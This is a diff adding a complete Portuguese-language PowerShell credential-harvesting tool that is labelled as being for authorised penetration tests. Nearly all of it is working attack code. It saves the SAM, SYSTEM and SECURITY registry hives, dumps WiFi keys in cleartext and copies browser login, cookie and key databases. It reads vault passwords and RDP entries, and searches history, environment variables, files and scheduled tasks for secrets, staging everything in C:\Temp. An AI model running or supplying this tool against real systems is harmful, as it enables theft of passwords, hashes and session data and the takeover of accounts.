@@ -1,0 +1,484 @@
+<#
+.SYNOPSIS
+    Coletor Completo de Credenciais e Hashes - Pentest Autorizado
+.DESCRIPTION
+    Coleta senhas, hashes, credenciais e informações sensíveis do sistema
+    USO EXCLUSIVO EM AMBIENTES AUTORIZADOS
+#>
+
+# Configurações iniciais
+$ErrorActionPreference = "SilentlyContinue"
+Set-ExecutionPolicy Bypass -Scope Process -Force
+Add-Type -AssemblyName System.Security
+
+# Verificação de administrador
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+# Configurações de saída
+$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
+$outputDir = "C:\Temp\FullAudit_$timestamp"
+New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
+
+$logFile = "$outputDir\full_audit_log.txt"
+$credsFile = "$outputDir\all_credentials.txt"
+$hashesFile = "$outputDir\password_hashes.txt"
+$wifiFile = "$outputDir\wifi_passwords.txt"
+$browserFile = "$outputDir\browser_data.txt"
+
+Start-Transcript -Path $logFile
+
+Write-Host "=== COLETOR COMPLETO DE CREDENCIAIS ===" -ForegroundColor Red
+Write-Host "Modo Administrador: $isAdmin" -ForegroundColor $(if($isAdmin){"Green"}else{"Red"})
+
+# Função para descriptografar credenciais
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+using System.Text;
+
+public class CredentialManager {
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    public static extern bool CredEnumerateW(string filter, int flag, out int count, out IntPtr credentials);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern void CredFree(IntPtr buffer);
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    public struct CREDENTIAL {
+        public uint flags;
+        public uint type;
+        public IntPtr targetName;
+        public string comment;
+        public System.Runtime.InteropServices.ComTypes.FILETIME lastWritten;
+        public uint credentialBlobSize;
+        public IntPtr credentialBlob;
+        public uint persist;
+        public uint attributeCount;
+        public IntPtr attributes;
+        public IntPtr targetAlias;
+        public IntPtr userName;
+    }
+}
+"@
+
+function Get-WiFiPasswordsDetailed {
+    Write-Host "[+] Coletando senhas WiFi detalhadas..." -ForegroundColor Cyan
+    $results = @()
+    
+    try {
+        # Obter todos os perfis WiFi
+        $profileOutput = netsh wlan show profiles
+        $profiles = $profileOutput | Select-String "Perfil de todos os usuários" | ForEach-Object { 
+            ($_ -split ":")[1].Trim() 
+        }
+
+        if ($profiles.Count -gt 0) {
+            foreach ($profile in $profiles) {
+                $results += "`n=== PERFIL WIFI: $profile ==="
+                $profileDetails = netsh wlan show profile name="$profile" key=clear
+                $results += $profileDetails
+                
+                # Extrair senha especificamente
+                $passwordLine = $profileDetails | Select-String "Conteúdo da Chave"
+                if ($passwordLine) {
+                    $password = ($passwordLine -split ":")[1].Trim()
+                    $results += "*** SENHA ENCONTRADA: $password ***"
+                }
+            }
+        } else {
+            $results += "Nenhum perfil WiFi encontrado."
+        }
+    } catch {
+        $results += "Erro WiFi: $($_.Exception.Message)"
+    }
+    
+    return $results
+}
+
+function Get-SAMHashes {
+    Write-Host "[+] Tentando extrair hashes do SAM..." -ForegroundColor Cyan
+    $results = @()
+    
+    if (-not $isAdmin) {
+        $results += "ACESSO NEGADO: Execute como Administrador para extrair hashes SAM"
+        return $results
+    }
+    
+    try {
+        # Método 1: Regedit para exportar SAM
+        reg save hklm\sam "$outputDir\sam.save" 2>&1 | Out-Null
+        reg save hklm\system "$outputDir\system.save" 2>&1 | Out-Null
+        reg save hklm\security "$outputDir\security.save" 2>&1 | Out-Null
+        
+        $results += "Arquivos SAM/SYSTEM salvos em: $outputDir"
+        
+        # Método 2: Usar PowerShell para hashes locais
+        $users = Get-WmiObject -Class Win32_UserAccount | Where-Object { $_.LocalAccount -eq $true }
+        
+        foreach ($user in $users) {
+            $results += "Usuário: $($user.Name) | SID: $($user.SID) | Status: $($user.Status)"
+        }
+        
+    } catch {
+        $results += "Erro SAM: $($_.Exception.Message)"
+    }
+    
+    return $results
+}
+
+function Get-LSASecrets {
+    Write-Host "[+] Coletando segredos do LSA..." -ForegroundColor Cyan
+    $results = @()
+    
+    if (-not $isAdmin) {
+        $results += "ACESSO NEGADO: Execute como Administrador para LSA"
+        return $results
+    }
+    
+    try {
+        # Tentar acessar LSA
+        reg save hklm\security "$outputDir\security.save" 2>&1 | Out-Null
+        
+        # Usar mimikatz se disponível (versão alternativa)
+        $results += "Segredos LSA exportados para análise offline"
+        
+    } catch {
+        $results += "Erro LSA: $($_.Exception.Message)"
+    }
+    
+    return $results
+}
+
+function Get-BrowserData {
+    Write-Host "[+] Coletando dados de navegadores..." -ForegroundColor Cyan
+    $results = @()
+    
+    # Chrome
+    try {
+        $chromePaths = @(
+            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
+            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data",
+            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
+        )
+        
+        foreach ($path in $chromePaths) {
+            if (Test-Path $path) {
+                Copy-Item $path "$outputDir\chrome_$(Split-Path $path -Leaf)" -Force -ErrorAction SilentlyContinue
+                $results += "Chrome: $(Split-Path $path -Leaf) copiado"
+            }
+        }
+    } catch { }
+
+    # Edge
+    try {
+        $edgePaths = @(
+            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
+            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"
+        )
+        
+        foreach ($path in $edgePaths) {
+            if (Test-Path $path) {
+                Copy-Item $path "$outputDir\edge_$(Split-Path $path -Leaf)" -Force -ErrorAction SilentlyContinue
+                $results += "Edge: $(Split-Path $path -Leaf) copiado"
+            }
+        }
+    } catch { }
+
+    # Firefox
+    try {
+        $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
+        if (Test-Path $firefoxPath) {
+            Get-ChildItem $firefoxPath -Recurse -Include "key4.db", "logins.json", "cookies.sqlite" | ForEach-Object {
+                Copy-Item $_.FullName $outputDir -Force -ErrorAction SilentlyContinue
+                $results += "Firefox: $($_.Name) copiado"
+            }
+        }
+    } catch { }
+    
+    return $results
+}
+
+function Get-CredentialManagerFull {
+    Write-Host "[+] Coletando Gerenciador de Credenciais..." -ForegroundColor Cyan
+    $results = @()
+    
+    try {
+        # Método 1: cmdkey
+        $cmdkeyResult = cmdkey /list 2>&1
+        $results += "=== CREDENCIAIS CMDKEY ==="
+        $results += $cmdkeyResult
+        
+        # Método 2: PowerShell Vault
+        try {
+            Add-Type -AssemblyName System.Security
+            
+            $vault = New-Object -ComObject Windows.Security.Credentials.PasswordVault -ErrorAction SilentlyContinue
+            if ($vault) {
+                $creds = $vault.RetrieveAll()
+                foreach ($cred in $creds) {
+                    $cred.RetrievePassword()
+                    $results += "Vault: $($cred.Resource) | User: $($cred.UserName) | Password: $($cred.Password)"
+                }
+            }
+        } catch { }
+        
+        # Método 3: Registry Credentials
+        $regPaths = @(
+            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\",
+            "HKCU\Software\Microsoft\Windows\CurrentVersion\Credentials\",
+            "HKCU\Software\Microsoft\IdentityCRL\",
+            "HKCU\Software\Microsoft\Office\",
+            "HKCU\Software\Microsoft\OneDrive\"
+        )
+        
+        foreach ($regPath in $regPaths) {
+            if (Test-Path $regPath) {
+                try {
+                    $items = Get-ChildItem $regPath -Recurse -ErrorAction SilentlyContinue
+                    foreach ($item in $items) {
+                        try {
+                            $values = Get-ItemProperty $item.PSPath -ErrorAction SilentlyContinue
+                            foreach ($value in $values.PSObject.Properties) {
+                                if ($value.Value -and $value.Value.GetType().Name -eq "String") {
+                                    if ($value.Value -match "password|senha|pwd|credential|token|key") {
+                                        $results += "Registry: $($item.PSPath) -> $($value.Name): $($value.Value)"
+                                    }
+                                }
+                            }
+                        } catch { }
+                    }
+                } catch { }
+            }
+        }
+        
+    } catch {
+        $results += "Erro Credential Manager: $($_.Exception.Message)"
+    }
+    
+    return $results
+}
+
+function Get-RDPCredentials {
+    Write-Host "[+] Coletando credenciais RDP..." -ForegroundColor Cyan
+    $results = @()
+    
+    try {
+        # Credenciais salvas do RDP
+        $rdpServers = Get-ChildItem "HKCU:\Software\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue
+        
+        if ($rdpServers) {
+            foreach ($server in $rdpServers) {
+                $serverName = $server.PSChildName
+                $userHint = Get-ItemProperty $server.PSPath -Name "UsernameHint" -ErrorAction SilentlyContinue
+                $results += "RDP Server: $serverName | UserHint: $($userHint.UsernameHint)"
+            }
+        }
+        
+        # Credenciais gerais RDP
+        $rdpCredentials = cmdkey /list | Where-Object { $_ -match "TERMSRV" }
+        if ($rdpCredentials) {
+            $results += "=== CREDENCIAIS RDP ENCONTRADAS ==="
+            $results += $rdpCredentials
+        }
+        
+    } catch {
+        $results += "Erro RDP: $($_.Exception.Message)"
+    }
+    
+    return $results
+}
+
+function Get-PowerShellHistory {
+    Write-Host "[+] Coletando histórico do PowerShell..." -ForegroundColor Cyan
+    $results = @()
+    
+    try {
+        $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+        if (Test-Path $historyPath) {
+            $history = Get-Content $historyPath -Raw
+            $results += "=== HISTORICO POWERSHELL ==="
+            $results += $history
+            
+            # Procurar por credenciais no histórico
+            $sensitiveCommands = $history -split "`n" | Where-Object { 
+                $_ -match "password|senha|pwd|credential|token|key|ConvertTo-SecureString" 
+            }
+            
+            if ($sensitiveCommands) {
+                $results += "=== COMANDOS SENSIVEIS NO HISTORICO ==="
+                $results += $sensitiveCommands
+            }
+        }
+    } catch {
+        $results += "Erro History: $($_.Exception.Message)"
+    }
+    
+    return $results
+}
+
+function Get-EnvironmentVariables {
+    Write-Host "[+] Coletando variáveis de ambiente..." -ForegroundColor Cyan
+    $results = @()
+    
+    try {
+        $envVars = Get-ChildItem Env: | Where-Object { 
+            $_.Value -match "password|senha|pwd|token|key|secret" -or
+            $_.Name -match "PASS|PWD|TOKEN|KEY|SECRET"
+        }
+        
+        if ($envVars) {
+            $results += "=== VARIAVEIS DE AMBIENTE SENSIVEIS ==="
+            foreach ($var in $envVars) {
+                $results += "$($var.Name)=$($var.Value)"
+            }
+        }
+    } catch {
+        $results += "Erro Environment: $($_.Exception.Message)"
+    }
+    
+    return $results
+}
+
+function Get-FileSystemCredentials {
+    Write-Host "[+] Procurando credenciais em arquivos..." -ForegroundColor Cyan
+    $results = @()
+    
+    try {
+        # Locais comuns onde credenciais são armazenadas
+        $searchPaths = @(
+            "$env:USERPROFILE\Desktop",
+            "$env:USERPROFILE\Documents", 
+            "$env:USERPROFILE\Downloads",
+            "$env:USERPROFILE\OneDrive",
+            "$env:USERPROFILE\*.txt",
+            "$env:USERPROFILE\*.xml",
+            "$env:USERPROFILE\*.config",
+            "$env:USERPROFILE\*.json"
+        )
+        
+        $keywords = @("password", "senha", "pwd", "connectionString", "token", "key", "secret")
+        
+        foreach ($path in $searchPaths) {
+            if (Test-Path $path) {
+                Get-ChildItem $path -Recurse -Include *.txt,*.xml,*.config,*.json,*.ps1,*.bat,*.cmd -ErrorAction SilentlyContinue | 
+                Select-Object -First 100 | ForEach-Object {
+                    try {
+                        $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
+                        if ($content) {
+                            foreach ($keyword in $keywords) {
+                                if ($content -match $keyword) {
+                                    $matches = [regex]::Matches($content, "(?i)$keyword.*?=.*?['`"]([^'`"]+)")
+                                    foreach ($match in $matches) {
+                                        $results += "ARQUIVO: $($_.FullName) | CREDENCIAL: $($match.Value)"
+                                    }
+                                }
+                            }
+                        }
+                    } catch { }
+                }
+            }
+        }
+    } catch {
+        $results += "Erro FileSystem: $($_.Exception.Message)"
+    }
+    
+    return $results
+}
+
+function Get-ScheduledTasksCredentials {
+    Write-Host "[+] Verificando tarefas agendadas..." -ForegroundColor Cyan
+    $results = @()
+    
+    try {
+        $tasks = Get-ScheduledTask | Where-Object { $_.State -eq "Ready" -or $_.State -eq "Running" }
+        
+        foreach ($task in $tasks) {
+            $taskInfo = Get-ScheduledTaskInfo $task.TaskName -ErrorAction SilentlyContinue
+            $taskActions = $task.Actions
+            
+            foreach ($action in $taskActions) {
+                if ($action.Execute -or $action.Arguments) {
+                    if ($action.Execute -match "password|senha|pwd" -or $action.Arguments -match "password|senha|pwd") {
+                        $results += "TAREFA: $($task.TaskName) | AÇÃO: $($action.Execute) $($action.Arguments)"
+                    }
+                }
+            }
+        }
+    } catch {
+        $results += "Erro ScheduledTasks: $($_.Exception.Message)"
+    }
+    
+    return $results
+}
+
+# EXECUÇÃO PRINCIPAL
+Write-Host "`nIniciando coleta completa..." -ForegroundColor Green
+
+try {
+    # Executar todas as funções de coleta
+    $allData = @()
+    
+    $allData += "=== AUDITORIA COMPLETA - $(Get-Date) ==="
+    $allData += "Computador: $env:COMPUTERNAME"
+    $allData += "Usuário: $env:USERNAME"
+    $allData += "Domínio: $env:USERDOMAIN"
+    $allData += "Admin: $isAdmin"
+    $allData += ""
+    
+    $allData += Get-WiFiPasswordsDetailed
+    $allData += ""
+    $allData += Get-SAMHashes  
+    $allData += ""
+    $allData += Get-LSASecrets
+    $allData += ""
+    $allData += Get-CredentialManagerFull
+    $allData += ""
+    $allData += Get-BrowserData
+    $allData += ""
+    $allData += Get-RDPCredentials
+    $allData += ""
+    $allData += Get-PowerShellHistory
+    $allData += ""
+    $allData += Get-EnvironmentVariables
+    $allData += ""
+    $allData += Get-FileSystemCredentials
+    $allData += ""
+    $allData += Get-ScheduledTasksCredentials
+    
+    # Salvar todos os dados
+    $allData | Out-File $credsFile -Encoding UTF8
+    
+    # Salvar dados específicos
+    Get-WiFiPasswordsDetailed | Out-File $wifiFile -Encoding UTF8
+    
+    Write-Host "`n" + "="*70 -ForegroundColor Green
+    Write-Host "COLETA COMPLETA CONCLUÍDA!" -ForegroundColor Green
+    Write-Host "="*70 -ForegroundColor Green
+    
+    Write-Host "`nArquivos salvos em: $outputDir" -ForegroundColor Yellow
+    Write-Host "• Credenciais completas: $credsFile" -ForegroundColor White
+    Write-Host "• Senhas WiFi: $wifiFile" -ForegroundColor White
+    Write-Host "• Dados navegadores: $browserFile" -ForegroundColor White
+    Write-Host "• Log execução: $logFile" -ForegroundColor White
+    
+    # Exibir resumo das descobertas
+    Write-Host "`n=== RESUMO DAS INFORMAÇÕES COLETADAS ===" -ForegroundColor Cyan
+    
+    $wifiCount = (Get-Content $wifiFile | Select-String "SENHA ENCONTRADA").Count
+    $credCount = (Get-Content $credsFile | Select-String "password|senha|token|key").Count
+    
+    Write-Host "Senhas WiFi encontradas: $wifiCount" -ForegroundColor $(if($wifiCount -gt 0){"Red"}else{"Yellow"})
+    Write-Host "Credenciais encontradas: $credCount" -ForegroundColor $(if($credCount -gt 0){"Red"}else{"Yellow"})
+    Write-Host "Arquivos de navegador copiados: $((Get-ChildItem $outputDir -Filter '*chrome*' -ErrorAction SilentlyContinue).Count)" -ForegroundColor Yellow
+    
+    Write-Host "`nAVISO CRÍTICO: Estas informações são EXTREMAMENTE SENSÍVEIS!" -ForegroundColor Red
+    Write-Host "Mantenha os arquivos seguros e DESTRUA após a análise!" -ForegroundColor Red
+    
+} catch {
+    Write-Host "ERRO NA EXECUÇÃO: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "Stack: $($_.ScriptStackTrace)" -ForegroundColor Red
+} finally {
+    Stop-Transcript
+}
+
+Write-Host "`nAuditoria finalizada: $(Get-Date)" -ForegroundColor Green
